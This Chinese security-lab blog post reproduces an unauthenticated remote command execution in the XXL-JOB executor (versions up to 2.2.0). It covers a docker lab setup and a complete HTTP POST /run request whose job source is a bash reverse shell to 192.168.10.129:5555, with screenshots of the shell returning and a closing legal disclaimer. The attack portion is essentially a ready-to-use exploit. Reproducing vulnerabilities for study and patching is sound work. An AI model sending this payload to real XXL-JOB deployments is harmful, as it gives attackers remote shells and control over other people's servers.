#  XXL-JOB executor 未授权访问漏洞   
NoCirc1e  巢安实验室   2024-06-16 15:30  
  
XXL-JOB介绍  
  
XXL-JOB是一个分布式任务调度平台，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。现已开放源代码并接入多家公司线上产品线，开箱即用。XXL-JOB分为admin和executor两端，前者为后台管理页面，后者是任务执行的客户端。executor默认没有配置认证，未授权的攻击者可以通过RESTful API执行任意命令。  
  
参考链接：  
- [https://mp.weixin.qq.com/s/jzXIVrEl0vbjZxI4xlUm-g](https://mp.weixin.qq.com/s?__biz=MzAwMTQwMjE0OA==&mid=2247483841&idx=1&sn=3f41c011f0709a644e1d1accbb1905b6&scene=21#wechat_redirect)  
  
  
- https://landgrey.me/blog/18/  
  
- https://github.com/OneSourceCat/XxlJob-Hessian-RCE  
  
## 漏洞影响  
  
XXL-JOB <= 2.2.0  
## 环境搭建  
  
执行如下命令启动2.2.0版本的XXL-JOB：  
  
```
docker-compose up -d
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVweDw0Nt5s5vvMN2bia0RfBTTYftzTL6oibqSxWW0kMpQeAo1uLpLibLm1hVGSuiakfnf8F1m2pdVZ7ZQ/640?wx_fmt=png&from=appmsg "")  
  
环境启动后，访问http://your-ip:9999可以查看到客户端（executor）。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVweDw0Nt5s5vvMN2bia0RfBTDxrk9YlIlicJFB7eOxyhq8M2vVA5palo3YXrMhbKLbT4yZG4j77otTA/640?wx_fmt=png&from=appmsg "")  
## 漏洞复现  
  
访问XXL-JOB存在漏洞版本的客户端（executor），利用burpsuite发送如下payload：  
  
```
POST /run HTTP/1.1
Host: your-ip:9999
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 396

{
  "jobId": 1,
  "executorHandler": "demoJobHandler",
  "executorParams": "demoJobHandler",
  "executorBlockStrategy": "COVER_EARLY",
  "executorTimeout": 0,
  "logId": 1,
  "logDateTime": 1586629003729,
  "glueType": "GLUE_SHELL",
  "glueSource": "/bin/bash -i >& /dev/tcp/192.168.10.129/5555 0>&1",
  "glueUpdatetime": 1586699003758,
  "broadcastIndex": 0,
  "broadcastTotal": 0
}
```  
  
  
开启监听后，即可反弹回shell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVweDw0Nt5s5vvMN2bia0RfBT73mdq9dWxxW3CzjdDoLMSa7YMjyibxWJiadk8icHX9dNENrnF5YlfTR3w/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/n2rSqJSRAVweDw0Nt5s5vvMN2bia0RfBT7rEg2GB8hkCiahibfnicKLUhkMAAO0ahmDz4gtJPnib1Gj5sdXgD0KNyfg/640?wx_fmt=png&from=appmsg "")  
  
  
**本文版权归作者和微信公众号平台共有，重在学习交流，不以任何盈利为目的，欢迎转载。**  
  
****  
**由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。公众号内容中部分攻防技巧等只允许在目标授权的情况下进行使用，大部分文章来自各大安全社区，个人博客，如有侵权请立即联系公众号进行删除。若不同意以上警告信息请立即退出浏览！！！**  
  
****  
**敲敲小黑板：《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。**  
  
  
